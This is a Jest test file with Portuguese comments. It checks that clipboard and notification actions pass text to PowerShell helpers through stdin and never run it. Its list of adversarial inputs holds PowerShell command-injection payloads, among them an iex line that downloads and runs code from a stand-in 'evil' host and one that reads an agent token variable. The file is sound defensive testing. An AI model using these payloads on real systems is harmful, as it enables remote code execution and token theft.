/**
 * SENTINELA — nenhum teste desta area pode iniciar processo, shell, gerenciador de pacotes ou
 * rede. Qualquer chamada a `child_process` LANCA, e a mensagem diz o que aconteceu.
 *
 * Existe porque em 2026-09-08 um teste meu rodou `pnpm install` de verdade (2587 ms): o
 * executor era importado direto e o mock veio depois. Teste de seguranca que executa o comando
 * que testa e um teste que causa o que investiga.
 */
const sentinela = (nome: string) => (...args: unknown[]) => {
  throw new Error(
    `SENTINELA: ${nome} foi chamado num teste — nenhum processo real pode subir aqui. ` +
    `Args: ${JSON.stringify(args).slice(0, 200)}`,
  )
}
jest.mock('child_process', () => ({
  execSync:      sentinela('execSync'),
  execFileSync:  sentinela('execFileSync'),
  spawnSync:     sentinela('spawnSync'),
  spawn:         sentinela('spawn'),
  exec:          sentinela('exec'),
  execFile:      sentinela('execFile'),
}))

import { clipboardWrite } from '../../actions/clipboard'
import { notify } from '../../actions/notify'
import { rodarHelper, caminhoDoHelper, type ExecutorDeHelper } from '../executar-helper'
import { readFileSync, existsSync } from 'fs'

/** Executor injetado: registra o que RECEBERIA, sem executar nada. */
function espiao() {
  const chamadas: Array<{ programa: string; args: string[]; entrada: string }> = []
  const executor: ExecutorDeHelper = (programa, args, entrada) => {
    chamadas.push({ programa, args, entrada })
    return ''
  }
  return { chamadas, executor }
}

/**
 * Os payloads que quebravam o caminho antigo, mais os que a decisao 4 exige.
 * O criterio e o mesmo para todos: o valor chega LITERAL ao destino e nada executa.
 */
const ADVERSARIAIS: Array<[string, string]> = [
  ['aspa simples',        "x'; Write-Output PWNED; '"],
  ['aspa dupla',          'x"; Write-Output PWNED; "'],
  ['ponto e virgula',     'x; Write-Output PWNED'],
  ['pipeline',            'x | Out-File C:\\temp\\pwned.txt'],
  ['substituicao $()',    '$(Write-Output PWNED)'],
  ['crase',               '`whoami`'],
  ['and/or',              'x && whoami || whoami'],
  ['quebra de linha',     'linha1\nWrite-Output PWNED'],
  ['carriage return',     'linha1\r\nWrite-Output PWNED'],
  ['unicode aspa curva',  'x\u201d; Write-Output PWNED; \u201c'],
  ['unicode travessao',   'x \u2014 y \u2013 z'],
  ['powershell iex',      'iex (New-Object Net.WebClient).DownloadString("http://evil")'],
  ['powershell &{}',      '&{Write-Output PWNED}'],
  ['expansao de var',     '$ExecutionContext; $env:AGENT_TOKEN'],
  ['nulo e controle',     'x\u0000\u0007y'],
]

describe('clipboard_write — payload adversarial chega literal, nada executa', () => {
  it.each(ADVERSARIAIS)('%s', async (_nome, payload) => {
    const { chamadas, executor } = espiao()

    await clipboardWrite({ text: payload }, executor)

    expect(chamadas).toHaveLength(1)
    const [c] = chamadas
    // 1. O payload viaja por STDIN, inteiro e sem alteração.
    expect(c.entrada).toBe(payload)
    // 2. O argv NÃO contém o payload — é o que impedia a injeção de existir.
    expect(c.args.join(' ')).not.toContain(payload)
    // 3. `-File` (caminho), nunca `-Command` (texto a interpretar).
    expect(c.args).toContain('-File')
    expect(c.args).not.toContain('-Command')
  })
})

describe('notify — payload adversarial vira dado JSON, nada executa', () => {
  it.each(ADVERSARIAIS)('%s', async (_nome, payload) => {
    const { chamadas, executor } = espiao()

    await notify({ title: payload, message: payload }, executor)

    expect(chamadas).toHaveLength(1)
    const [c] = chamadas
    const dados = JSON.parse(c.entrada) as { titulo: string; mensagem: string }
    // Chega literal (respeitado o truncamento de exibição, que não é defesa).
    expect(dados.titulo).toBe(payload.slice(0, 100))
    expect(dados.mensagem).toBe(payload.slice(0, 250))
    expect(c.args.join(' ')).not.toContain(payload)
    expect(c.args).not.toContain('-Command')
  })
})

describe('executar-helper — a forma da chamada', () => {
  it('o argv contém apenas o caminho do helper, que é constante', () => {
    const { chamadas, executor } = espiao()
    rodarHelper('clipboard-write', 'qualquer coisa', executor)
    expect(chamadas[0].programa).toBe('powershell.exe')
    expect(chamadas[0].args.filter((a) => a.endsWith('.ps1'))).toHaveLength(1)
  })

  it('os dois helpers existem no disco — ausência cairia de volta no caminho antigo', () => {
    for (const nome of ['clipboard-write', 'notify'] as const) {
      expect(existsSync(caminhoDoHelper(nome))).toBe(true)
    }
  })

  /**
   * O `.ps1` nao pode reintroduzir a interpolacao do lado de la: `Invoke-Expression` sobre o
   * conteudo lido desfaria tudo.
   */
  it.each(['clipboard-write', 'notify'] as const)('%s.ps1 não usa Invoke-Expression', (nome) => {
    const ps = readFileSync(caminhoDoHelper(nome), 'utf8')
    expect(ps).not.toMatch(/Invoke-Expression|\biex\b/i)
  })
})

/**
 * ANTI-DRIFT: as duas acoes nao podem voltar a montar comando por template. A assercao e no
 * codigo SEM comentarios — os comentarios explicam justamente o defeito antigo e casariam.
 */
describe('anti-drift — nenhuma interpolação de payload em comando', () => {
  const semComentarios = (arquivo: string) =>
    readFileSync(require('path').join(__dirname, '..', '..', 'actions', arquivo), 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/(^|[^:])\/\/.*$/gm, '$1')

  it.each(['clipboard.ts', 'notify.ts'])('%s não monta comando com template', (arquivo) => {
    const codigo = semComentarios(arquivo)
    expect(codigo).not.toMatch(/-Command\s*"\$\{|\$\{(text|title|message|script)\}/)
    expect(codigo).not.toMatch(/execSync/)
  })

  it('notify não tem mais fallback que interpola', () => {
    expect(semComentarios('notify.ts')).not.toMatch(/ShowBalloonTip/)
  })
})
